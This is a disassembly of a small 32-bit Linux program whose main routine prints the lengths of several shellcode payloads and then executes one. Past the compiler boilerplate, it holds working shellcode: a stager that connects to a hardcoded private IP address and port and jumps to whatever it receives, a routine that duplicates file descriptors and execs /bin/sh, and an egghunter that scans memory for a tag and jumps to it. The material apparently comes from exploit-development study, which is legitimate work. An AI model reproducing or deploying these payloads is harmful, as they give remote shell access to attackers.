das
insb   (%dx),%es:(%edi)
imul   $0x6c2d646c,0x2f(%edx),%esp
imul   $0x6f732e78,0x75(%esi),%ebp
xor    %cs:(%eax),%al
add    $0x0,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%edx)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
add    %bl,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %ah,%bl
add    0x55(%edi),%ecx
sbb    $0x7fbcb99d,%eax
sarl   %cl,0x50(%edx)
test   $0xc4,%al
xor    (%ebx,%eiz,1),%eax
.byte 0x15
push   %ebp
.byte 0xdd
add    (%eax),%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    $0x0,%eax
and    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax,%eax,1)
add    %al,(%eax)
lods   %ds:(%esi),%eax
dec    %ebx
jecxz  804818c <_init-0x128>
sbb    (%eax),%al
add    %al,(%eax)
adc    (%eax),%al
add    %al,(%eax)
xor    (%eax),%eax
add    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
and    %eax,(%eax)
add    %al,(%eax)
adc    (%eax),%al
add    %al,(%eax)
or     (%eax),%eax
add    %al,(%eax)
cld
test   %al,(%eax,%ecx,1)
add    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
.byte 0xf
add    %ch,0x62(%ecx,%ebp,2)
arpl   %bp,(%esi)
jae    8048293 <_init-0x21>
cs add %bl,%cs:%ss:0x49(%edi)
dec    %edi
pop    %edi
jae    80482a1 <_init-0x13>
imul   $0x64657375,%fs:0x5f(%esi),%ebp
add    %dh,0x72(%eax)
imul   $0x5f5f0066,0x74(%esi),%ebp
insb   (%dx),%es:(%edi)
imul   $0x6174735f,0x63(%edx),%esp
jb     80482bd <_init+0x9>
pop    %edi
insl   (%dx),%es:(%edi)
popa
imul   $0x6d675f5f,0x0(%esi),%ebp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
pop    %edi
jae    80482cc <_init+0x18>
popa
jb     80482cf <_init+0x1b>
pop    %edi
pop    %edi
add    %al,0x4c(%edi)
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
add    (%eax),%al
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    %ch,0x69(%ecx)
or     $0x20000,%eax
inc    %edx
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
cld
lahf
add    $0x8,%al
push   %es
add    (%eax),%al
or     $0xa0,%al
add    $0x8,%al
pop    %es
add    %eax,(%eax)
add    %dl,(%eax)
mov    0x2070804,%al
add    %al,(%eax)
adc    $0xa0,%al
add    $0x8,%al
pop    %es
add    (%eax),%eax
push   %ebx
sub    $0x8,%esp
call   8048350 <__x86.get_pc_thunk.bx>
add    $0x1d43,%ebx
mov    -0x4(%ebx),%eax
test   %eax,%eax
je     80482d2 <_init+0x1e>
call   8048300 <__gmon_start__@plt>
add    $0x8,%esp
pop    %ebx
ret
pushl  0x804a004
jmp    *0x804a008
add    %al,(%eax)
jmp    *0x804a00c
push   $0x0
jmp    80482e0 <_init+0x2c>
jmp    *0x804a010
push   $0x8
jmp    80482e0 <_init+0x2c>
jmp    *0x804a014
push   $0x10
jmp    80482e0 <_init+0x2c>
xor    %ebp,%ebp
pop    %esi
mov    %esp,%ecx
and    $0xfffffff0,%esp
push   %eax
push   %esp
push   %edx
push   $0x80484e0
push   $0x8048470
push   %ecx
push   %esi
push   $0x804841d
call   8048310 <__libc_start_main@plt>
hlt
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    (%esp),%ebx
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    $0x804a0f7,%eax
sub    $0x804a0f4,%eax
cmp    $0x6,%eax
ja     8048370 <deregister_tm_clones+0x10>
ret
mov    $0x0,%eax
test   %eax,%eax
je     804836f <deregister_tm_clones+0xf>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x804a0f4,(%esp)
call   *%eax
leave
ret
lea    0x0(%esi),%esi
mov    $0x804a0f4,%eax
sub    $0x804a0f4,%eax
sar    $0x2,%eax
mov    %eax,%edx
shr    $0x1f,%edx
add    %edx,%eax
sar    %eax
jne    80483a9 <register_tm_clones+0x19>
ret
mov    $0x0,%edx
test   %edx,%edx
je     80483a8 <register_tm_clones+0x18>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
mov    %eax,0x4(%esp)
movl   $0x804a0f4,(%esp)
call   *%edx
leave
ret
mov    %esi,%esi
lea    0x0(%edi,%eiz,1),%edi
cmpb   $0x0,0x804a0f1
jne    80483ec <__do_global_dtors_aux+0x1c>
push   %ebp
mov    %esp,%ebp
sub    $0x8,%esp
call   8048360 <deregister_tm_clones>
movb   $0x1,0x804a0f1
leave
repz ret
xchg   %ax,%ax
mov    0x8049f10,%eax
test   %eax,%eax
je     8048418 <frame_dummy+0x28>
mov    $0x0,%eax
test   %eax,%eax
je     8048418 <frame_dummy+0x28>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x8049f10,(%esp)
call   *%eax
leave
jmp    8048390 <register_tm_clones>
nop
jmp    8048390 <register_tm_clones>
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
sub    $0x10,%esp
movl   $0x30,0x4(%esp)
movl   $0x8048500,(%esp)
call   80482f0 <printf@plt>
movl   $0x3b,0x4(%esp)
movl   $0x8048518,(%esp)
call   80482f0 <printf@plt>
movl   $0x2c,0x4(%esp)
movl   $0x8048530,(%esp)
call   80482f0 <printf@plt>
mov    $0x804a0c0,%eax
call   *%eax
leave
ret
xchg   %ax,%ax
xchg   %ax,%ax
nop
push   %ebp
push   %edi
xor    %edi,%edi
push   %esi
push   %ebx
call   8048350 <__x86.get_pc_thunk.bx>
add    $0x1b85,%ebx
sub    $0x1c,%esp
mov    0x30(%esp),%ebp
lea    -0xf4(%ebx),%esi
call   80482b4 <_init>
lea    -0xf8(%ebx),%eax
sub    %eax,%esi
sar    $0x2,%esi
test   %esi,%esi
je     80484c9 <__libc_csu_init+0x59>
lea    0x0(%esi),%esi
mov    0x38(%esp),%eax
mov    %ebp,(%esp)
mov    %eax,0x8(%esp)
mov    0x34(%esp),%eax
mov    %eax,0x4(%esp)
call   *-0xf8(%ebx,%edi,4)
add    $0x1,%edi
cmp    %esi,%edi
jne    80484a8 <__libc_csu_init+0x38>
add    $0x1c,%esp
pop    %ebx
pop    %esi
pop    %edi
pop    %ebp
ret
jmp    80484e0 <__libc_csu_fini>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
repz ret
push   %ebx
sub    $0x8,%esp
call   8048350 <__x86.get_pc_thunk.bx>
add    $0x1b13,%ebx
add    $0x8,%esp
pop    %ebx
ret
add    (%eax),%eax
add    %eax,(%eax)
add    (%eax),%al
gs
addr32 addr16 push $0x65746e75
jb     804852a <_IO_stdin_used+0x2e>
insb   (%dx),%es:(%edi)
outsb  %gs:(%esi),(%dx)
addr16 je 8048578 <_IO_stdin_used+0x7c>
cmp    (%eax),%ah
and    %ah,(%eax)
and    $0x73000a64,%eax
push   $0x636c6c65
outsl  %ds:(%esi),(%dx)
fs xor %esp,%fs:%gs:(%eax)
insb   (%dx),%es:(%edi)
outsb  %gs:(%esi),(%dx)
addr16 je 8048591 <_IO_stdin_used+0x95>
cmp    (%eax),%ah
and    %ah,0x73000a64
push   $0x636c6c65
outsl  %ds:(%esi),(%dx)
fs xor %fs:%gs:(%eax),%ah
insb   (%dx),%es:(%edi)
outsb  %gs:(%esi),(%dx)
addr16 je 80485a9 <_IO_stdin_used+0xad>
cmp    (%eax),%ah
.byte 0x20
.byte 0x25
or     %fs:(%eax),%al
add    %ebx,(%ebx)
add    (%ebx),%edi
sub    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cwtl
std
(bad)
incl   0x0(%eax,%eax,1)
add    %dl,%ch
(bad)
(bad)
ljmp   *0x0(%eax)
add    %al,(%eax)
sub    %bh,%bh
(bad)
decl   -0x68000000(%eax)
(bad)
(bad)
inc    %esp
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %edi,0x52(%edx)
add    %al,(%ecx)
jl     804858b <_IO_stdin_used+0x8f>
add    %ebx,(%ebx)
or     $0x4,%al
add    $0x88,%al
add    %eax,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
dec    %esp
std
(bad)
incl   0x0(%eax)
add    %al,(%eax)
add    %cl,(%esi)
or     %al,0xe(%esi)
or     $0x4a,%al
ud2
je     80485ab <_IO_stdin_used+0xaf>
js     80485a9 <_IO_stdin_used+0xad>
aas
sbb    (%ebx),%bh
sub    (%edx),%dh
and    $0x22,%al
sbb    $0x0,%al
add    %al,(%eax)
inc    %eax
add    %al,(%eax)
add    %ah,-0x2(%ebp)
(bad)
decl   0x0(%esi)
add    %al,(%eax)
add    %al,0xe(%ecx)
or     %al,0x50d4202(%ebp)
add    -0x3b(%edx),%cl
or     $0x4,%al
add    $0x0,%al
cmp    %al,(%eax)
add    %al,(%eax)
pusha
add    %al,(%eax)
add    %bl,0x61fffffe(%eax)
add    %al,(%eax)
add    %al,(%eax)
inc    %ecx
push   %cs
or     %al,0xc0e4102(%ebp)
xchg   %eax,(%ebx)
inc    %ebx
push   %cs
adc    %al,0x140e4104(%esi)
addl   $0x48,0x2300e4e
push   %cs
adc    $0x41,%al
ret
push   %cs
adc    %al,-0x3a(%ecx)
push   %cs
or     $0x41,%al
(bad)
push   %cs
or     %al,-0x3b(%ecx)
push   %cs
add    $0x10,%al
add    %al,(%eax)
add    %bl,-0x1340000(%eax,%eax,1)
(bad)
incl   (%edx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
lock
.byte 0x83
add    $0x8,%al
.byte 0xd0
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
mov    $0x82,%ah
add    $0x8,%al
or     $0xe4000000,%eax
test   %al,(%eax,%ecx,1)
sbb    %eax,(%eax)
add    %al,(%eax)
or     %bl,0x1b0804(%edi)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
or     $0x9f,%al
add    $0x8,%al
sbb    $0x0,%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cmc
(bad)
ljmp   *-0x54(%edi)
addl   $0x5,(%eax,%ecx,1)
sbb    $0x82,%al
add    $0x8,%al
push   %es
add    %al,(%eax)
add    %cl,%ah
addl   $0xa,(%eax,%ecx,1)
dec    %esp
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %dl,(%eax)
add    %al,(%eax)
add    %dl,0x0
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
mov    0x20804,%al
add    %al,(%eax)
sbb    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
add    %al,(%eax)
pop    %ss
add    %al,(%eax)
add    %bl,0x110804(%edx,%eax,4)
add    %al,(%eax)
xchg   %eax,%esp
(bad)
add    $0x8,%al
adc    (%eax),%al
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
adc    (%eax),%eax
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
(bad)
(bad)
ljmp   *0x74(%edi)
(bad)
add    $0x8,%al
(bad)
(bad)
ljmp   *0x1(%edi)
add    %al,(%eax)
add    %dh,%al
(bad)
ljmp   *0x68(%edi)
(bad)
add    $0x8,%al
add    %al,(%eax)
adc    $0x9f,%al
add    $0x8,%al
testb  $0x4,-0x7cf9f7fc(%edx)
or     %dl,(%esi)
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
xchg   %eax,%ebx
push   %ecx
xchg   %eax,%ebx
pop    %ecx
add    %edx,-0x6d(%ecx)
pop    %ecx
xor    %ebx,%ebx
mul    %ebx
mov    $0x66,%al
inc    %ebx
push   %edx
push   %ebx
push   $0x2
mov    %esp,%ecx
int    $0x80
xchg   %eax,%esi
mov    $0x66,%al
mov    $0x3,%bl
push   $0x17aa8c0
pushw  $0xcdab
pushw  $0x2
mov    %esp,%ecx
push   $0x10
push   %ecx
push   %esi
mov    %esp,%ecx
int    $0x80
add    $0x20,%esp
pop    %edi
sub    $0x24,%esp
jmp    *%edi
add    %al,(%eax)
add    %al,(%eax)
xchg   %eax,%ebx
push   %ecx
xchg   %eax,%ebx
pop    %ecx
add    -0x6d(%ecx),%dl
pop    %ecx
pop    %ebx
push   $0x2
pop    %ecx
mov    $0x3f,%al
int    $0x80
dec    %ecx
jns    804a08c <shellcode2+0xc>
xor    %eax,%eax
mov    $0xb,%al
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
mov    %esp,%edx
push   %ebx
mov    %esp,%ecx
int    $0x80
push   $0x2
pop    %ecx
push   %edi
push   %ecx
xor    %ecx,%ecx
or     $0xfff,%cx
inc    %ecx
push   $0x43
pop    %eax
int    $0x80
cmp    $0xf2,%al
je     804a0c7 <egghunter+0x7>
mov    $0x59935193,%eax
mov    %ecx,%edi
scas   %es:(%edi),%eax
jne    804a0cc <egghunter+0xc>
mov    %ecx,%ebx
pop    %ecx
and    %cl,%al
scas   %es:(%edi),%eax
push   %ecx
mov    %ebx,%ecx
jne    804a0cc <egghunter+0xc>
pop    %ecx
loop   804a0c3 <egghunter+0x3>
jmp    *%edi
add    %al,(%eax)
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    78 <_init-0x804823c>
je     81 <_init-0x8048233>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x2d,%al
xor    0x62(%ebp),%dh
jne    86 <_init-0x804822e>
je     8f <_init-0x8048225>
xor    %edi,0x31(%esi)
xor    $0x2e,%al
xor    %dh,(%ecx,%ebp,1)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x0,%al
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    a1 <_init-0x8048213>
je     aa <_init-0x804820a>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    0x62753931,%ch
jne    b0 <_init-0x8048204>
je     b9 <_init-0x80481fb>
xor    %ebp,(%ecx)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    (%eax),%al
